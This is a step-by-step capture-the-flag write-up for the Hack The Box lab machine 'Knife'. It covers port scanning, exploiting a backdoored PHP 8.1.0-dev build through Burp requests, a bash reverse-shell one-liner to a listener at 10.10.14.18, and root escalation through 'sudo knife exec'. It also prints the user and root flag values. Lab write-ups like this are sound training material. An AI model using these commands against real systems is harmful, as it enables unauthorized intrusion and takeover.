![Knife.PNG](/assets/Machines/Easy/Knife/Knife.png)


1. Send an ICMP echo request to machine's IP address.
```bash
┌──(root㉿est)-[/home/kali]
└─| ping -c 2 10.10.10.242
```


2. Scan open ports with **nmap**.
```bash
┌──(root㉿kali)-[/home/kali]
└─| nmap -p- --open -vv -sS --min-rate 5000 -Pn -n 10.10.10.242
```

**Output**
```bash
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

3. Use **whatweb** to discover services in web page
```bash
┌──(root㉿kali)-[/home/kali]
└─| whatweb 10.10.10.242
```

**Output**
```bash
http://10.10.10.242 [200 OK] Apache[2.4.41], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.10.10.242], PHP[8.1.0-dev], Script, Title[Emergent Medical Idea], X-Powered-By[PHP/8.1.0-dev]
```

4. Search exploit of `PHP/8.1.0-dev`

**Output**

![exploit.PNG](/assets/Machines/Easy/Knife/exploit.PNG)

5. Capture a petition of web page with **Burpsuite**

![petition.PNG](/assets/Machines/Easy/Knife/petition.PNG)

6. Include the exploit in petition, run any command to test

![pet_x.PNG](/assets/Machines/Easy/Knife/pet_x.PNG)


**Output**

![output1.PNG](/assets/Machines/Easy/Knife/output1.PNG)

7. Listen with **nc** in port **443**
8. Execute a command to get a reverse shell

* Command: `bash -c 'bash -i >& /dev/tcp/10.10.14.18/443 0>&1`

9. Put the command in petition and run

**Output**
```bash
┌──(root㉿kali)-[/home/kali]
└─| nc -lvnp 443
listening on [any] 443 ...
connect to [10.10.14.18] from (UNKNOWN) [10.10.10.242] 48524
bash: cannot set terminal process group (967): Inappropriate ioctl for device
bash: no job control in this shell
james@knife:/$ whoami
whoami
james
```

10. Cat **user flag**
```bash
james@knife:~$ cat user.txt 
0e5bdfa30d5df6156a2abcf355a5311c
```

11. Use **sudo -l** to find files we can execute how root temporaly
```bash
james@knife:~$ sudo -l
Matching Defaults entries for james on knife:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User james may run the following commands on knife:
    (root) NOPASSWD: /usr/bin/knife
```

12. Search in **https://gtfobins.github.io/** how exploit this binary.


![gto.PNG](/assets/Machines/Easy/Knife/gto.PNG)

13. Execute the command
```bash
james@knife:~$ sudo knife exec -E 'exec "/bin/sh"'
# whoami
root
```

14. Cat **root flag**
```bash
# cat /root/root.txt
87235b7b4c03e164310f2e6adb6f0ee1
```